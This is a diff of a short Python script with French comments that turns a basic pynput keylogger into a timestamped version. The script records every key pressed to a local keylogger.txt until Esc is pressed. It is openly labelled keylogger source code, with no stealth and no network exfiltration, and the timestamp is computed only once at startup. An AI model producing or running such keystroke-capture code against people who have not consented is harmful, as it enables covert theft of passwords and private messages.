@@ -1,29 +1,39 @@
 from pynput import keyboard
+from datetime import datetime
 
-def pression(key):
-    """enregistre la touche pressee dans le fichier"""
+timestamp = datetime.now().strftime("%d-%m-%y %H:%M:%S")
+
+def onPush(key):
+    """
+    enregistre dans un fichier texte les touches frappes
+    """
 
     try:
-        with open("keylogger.txt","a") as f:
-            f.write(key.char)
-    except AttributeError:
+        with open("keylogger.txt", "a") as f:
+            f.write(f"{timestamp} : {key.char}\n")  # on gere les touches alphanumeriques
+    except AttributeError as e:  # on decide de gerer les autres touches
         if key == keyboard.Key.space:
-            with open("keylogger.txt","a") as f:
-                f.write("keyboard.Key.space")
+            with open("keylogger.txt", "a") as f:
+                f.write(" ")  # on ecrit un espace
+        elif key == keyboard.Key.enter:
+            with open("keylogger.txt", "a") as f:
+                f.write("\n")  # on ecrit dans le fichier un saut à la ligne
         else:
-            with open("keylogger.txt","a") as f:
-                f.write("key")
-def relachement(key):
-    """sort du programme avec une touche speciale"""
+            with open("keylogger.txt", "a") as f:
+                f.write(f"{timestamp} : {key}\n")
+
+def onRelease(key):
+    """
+    arrete le programme par la touche esc
+    """
 
     if key == keyboard.Key.esc:
         return False
 
+
 if __name__ == "__main__":
-    with keyboard.Listener(on_press=pression,on_release=relachement) as l:
-        l.join()
-
-
+    with keyboard.Listener(on_press=onPush,on_release=onRelease) as listener:   # on creer un ecouteur pour surveiller le clavier
+        listener.join() #on bloque le listener, on le laisse en cours d'execution
 
 
 
